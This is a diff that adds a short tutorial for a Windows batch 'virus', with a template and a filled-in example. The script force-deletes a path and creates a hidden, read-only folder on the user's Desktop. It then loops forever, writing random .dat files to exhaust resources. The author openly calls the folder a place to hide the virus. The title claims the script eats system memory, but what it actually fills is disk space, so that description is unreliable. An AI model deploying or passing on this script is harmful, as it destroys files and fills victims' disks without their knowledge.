@@ -1,0 +1,28 @@
+How to eat system memory anywhere you want:
+
+
+@echo off
+if exist C:\(Path) del /F /Q C:\(Path)
+mkdir C:\(Where you want to make your HIVE)
+Attrib C:\(Where you want to make your HIVE) +H +R
+:loop
+echo. >>C:(your HIVE)\0000%random%.dat 
+goto loop
+
+
+EXAMPLE:
+=========
+
+@echo off
+if exist C:\Users\%username%\Desktop\MeME4tr del /F /Q C:\Users\%username%\Desktop\MeME4tr
+mkdir C:\Users\%username%\Desktop\MeME4tr
+Attrib C:\Users\%username%\Desktop\MeME4tr +H +R
+:loop
+echo. >>C:\Users\%username%\Desktop\MeME4tr\0000%random%.dat 
+goto loop
+
+
+NOTE: First it will make a folder to hide your virus and memory
+files (Aka: your hive) which will all be hidden by attributes. 
+It will make random data files insdide your hive that begin with
+for 0's and end with random number suffixes.
